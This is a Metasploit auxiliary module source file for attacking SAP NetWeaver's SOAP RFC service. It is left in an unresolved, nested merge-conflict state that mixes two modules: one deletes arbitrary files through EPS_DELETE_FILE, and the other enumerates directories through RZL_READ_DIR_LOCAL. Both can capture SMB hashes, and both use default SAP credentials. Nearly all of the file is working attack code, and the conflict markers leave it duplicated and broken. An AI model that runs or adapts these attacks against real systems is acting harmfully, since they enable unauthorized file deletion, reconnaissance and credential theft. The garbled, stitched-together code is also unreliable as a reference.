##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'
<<<<<<< HEAD
=======
require 'rexml/document'
>>>>>>> ee28b1a90e3162d0936fada451d392642716f256

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

<<<<<<< HEAD
	def initialize
		super(
<<<<<<< HEAD
			'Name' => 'SAP SOAP EPS_DELETE_FILE File Deletion',
			'Description' => %q{
					This module abuses the SAP NetWeaver EPS_DELETE_FILE function, on the SAP SOAP
				RFC Service, to delete arbitrary files on the remote file system. The module can
				also be used to capture SMB hashes by using a fake SMB share as DIRNAME.
			},
			'References' => [
				[ 'OSVDB', '74780' ],
				[ 'URL', 'http://dsecrg.com/pages/vul/show.php?id=331' ],
				[ 'URL', 'https://service.sap.com/sap/support/notes/1554030' ]
			],
			'Author' =>
				[
					'Alexey Sintsov', # Vulnerability discovery
					'nmonkee' # Metasploit module
				],
			'License' => MSF_LICENSE
			)

		register_options([
			Opt::RPORT(8000),
			OptString.new('CLIENT', [true, 'SAP Client', '001']),
			OptString.new('USERNAME', [true, 'Username', 'SAP*']),
			OptString.new('PASSWORD', [true, 'Password', '06071992']),
			OptString.new('DIRNAME', [true, 'Directory Path which contains the file to delete', '/tmp']),
			OptString.new('FILENAME', [true, 'Filename to delete', 'msf.txt'])
		], self.class)
	end

=======
			'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
			'Description' => %q{
					This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
				SOAP RFC Service, to enumerate directory contents. It returns only the first 32
				characters of the filename since they are truncated. The module can also be used to
				capture SMB hashes by using a fake SMB share as DIR.
			},
			'References' => [
				[ 'OSVDB', '92732'],
				[ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
			],
			'Author' =>
				[
					'Alexey Tyurin', # Vulnerability discovery
					'nmonkee' # Metasploit module
				],
			'License' => MSF_LICENSE
		)
=======
  def initialize
    super(
      'Name' => 'SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing',
      'Description' => %q{
          This module exploits the SAP NetWeaver RZL_READ_DIR_LOCAL function, on the SAP
        SOAP RFC Service, to enumerate directory contents. It returns only the first 32
        characters of the filename since they are truncated. The module can also be used to
        capture SMB hashes by using a fake SMB share as DIR.
      },
      'References' => [
        [ 'OSVDB', '92732'],
        [ 'URL', 'http://erpscan.com/advisories/dsecrg-12-026-sap-netweaver-rzl_read_dir_local-missing-authorization-check-and-smb-relay-vulnerability/' ]
      ],
      'Author' =>
        [
          'Alexey Tyurin', # Vulnerability discovery
          'nmonkee' # Metasploit module
        ],
      'License' => MSF_LICENSE
    )
>>>>>>> 1197426b40866489f2e0fcf84f5910da73761a3e

    register_options([
      OptString.new('CLIENT', [true, 'SAP Client', '001']),
      OptString.new('USERNAME', [true, 'Username', 'SAP*']),
      OptString.new('PASSWORD', [true, 'Password', '06071992']),
      OptString.new('DIR',[true,'Directory path (e.g. /etc)','/etc'])
    ], self.class)
  end

  def parse_xml(xml_data)
    files = []
    xml_doc = REXML::Document.new(xml_data)
    xml_doc.root.each_element('//item') do |item|
      name = size = nil
      item.each_element do |elem|
        name = elem.text if elem.name == "NAME"
        size = elem.text if elem.name == "SIZE"
        break if name and size
      end
      if (name and size) and not (name.empty? or size.empty?)
        files << { "name" => name, "size" => size }
      end
    end
    return files
  end

<<<<<<< HEAD
>>>>>>> ee28b1a90e3162d0936fada451d392642716f256
	def run_host(ip)
		data = '<?xml version="1.0" encoding="utf-8" ?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
		data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
		data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
		data << '<SOAP-ENV:Header/>'
		data << '<SOAP-ENV:Body>'
<<<<<<< HEAD
		data << '<EPS_DELETE_FILE xmlns="urn:sap-com:document:sap:rfc:functions">'
		data << '<DIR_NAME>' + datastore['DIRNAME'] + '</DIR_NAME>'
		data << '<FILE_NAME>' + datastore['FILENAME'] + '</FILE_NAME>'
		data << '<IV_LONG_DIR_NAME></IV_LONG_DIR_NAME>'
		data << '<IV_LONG_FILE_NAME></IV_LONG_FILE_NAME>'
		data << '</EPS_DELETE_FILE>'
=======
		data << '<RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">'
		data << '<FILE_TBL>'
		data << '<item>'
		data << '<NAME></NAME>'
		data << '<SIZE></SIZE>'
		data << '</item>'
		data << '</FILE_TBL>'
		data << '<NAME>' + datastore['DIR'] + '</NAME>'
		data << '</RZL_READ_DIR_LOCAL>'
>>>>>>> ee28b1a90e3162d0936fada451d392642716f256
		data << '</SOAP-ENV:Body>'
		data << '</SOAP-ENV:Envelope>'

		begin
<<<<<<< HEAD
			vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
=======
			vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
>>>>>>> ee28b1a90e3162d0936fada451d392642716f256
			res = send_request_cgi({
				'uri' => '/sap/bc/soap/rfc',
				'method' => 'POST',
				'data' => data,
				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
				'ctype' => 'text/xml; charset=UTF-8',
				'headers' => {
					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
				},
				'vars_get' => {
					'sap-client' => datastore['CLIENT'],
					'sap-language' => 'EN'
				}
			})
<<<<<<< HEAD

			if res and res.code == 200 and res.body =~ /EPS_DELETE_FILE.Response/ and res.body.include?(datastore['FILENAME']) and res.body.include?(datastore['DIRNAME'])
				print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
			elsif res
				vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
				vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
				vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
			end
			rescue ::Rex::ConnectionError
				print_error("#{rhost}:#{rport} - Unable to connect")
				return
			end
		end
	end
=======
			if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
				files = parse_xml(res.body)
				path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
				print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
				files.each { |f|
					vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
				}
			end
		rescue ::Rex::ConnectionError
			vprint_error("#{rhost}:#{rport} - Unable to connect")
			return
		end
	end
=======
  def run_host(ip)
    data = '<?xml version="1.0" encoding="utf-8" ?>'
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  '
    data << 'xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  '
    data << 'xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">'
    data << '<SOAP-ENV:Header/>'
    data << '<SOAP-ENV:Body>'
    data << '<RZL_READ_DIR_LOCAL xmlns="urn:sap-com:document:sap:rfc:functions">'
    data << '<FILE_TBL>'
    data << '<item>'
    data << '<NAME></NAME>'
    data << '<SIZE></SIZE>'
    data << '</item>'
    data << '</FILE_TBL>'
    data << '<NAME>' + datastore['DIR'] + '</NAME>'
    data << '</RZL_READ_DIR_LOCAL>'
    data << '</SOAP-ENV:Body>'
    data << '</SOAP-ENV:Envelope>'

    begin
      vprint_status("#{rhost}:#{rport} - Sending request to enumerate #{datastore['DIR']}")
      res = send_request_cgi({
        'uri' => '/sap/bc/soap/rfc',
        'method' => 'POST',
        'data' => data,
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
        'ctype' => 'text/xml; charset=UTF-8',
        'headers' => {
          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
        },
        'vars_get' => {
          'sap-client' => datastore['CLIENT'],
          'sap-language' => 'EN'
        }
      })
      if res and res.code == 200 and res.body =~ /rfc:RZL_READ_DIR_LOCAL.Response/
        files = parse_xml(res.body)
        path = store_loot("sap.soap.rfc.dir", "text/xml", rhost, res.body, datastore['DIR'])
        print_good("#{rhost}:#{rport} - #{datastore['DIR']} successfully enumerated, results stored on #{path}")
        files.each { |f|
          vprint_line("Entry: #{f["name"]}, Size: #{f["size"].to_i}")
        }
      end
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Unable to connect")
      return
    end
  end
>>>>>>> 1197426b40866489f2e0fcf84f5910da73761a3e
end
>>>>>>> ee28b1a90e3162d0936fada451d392642716f256
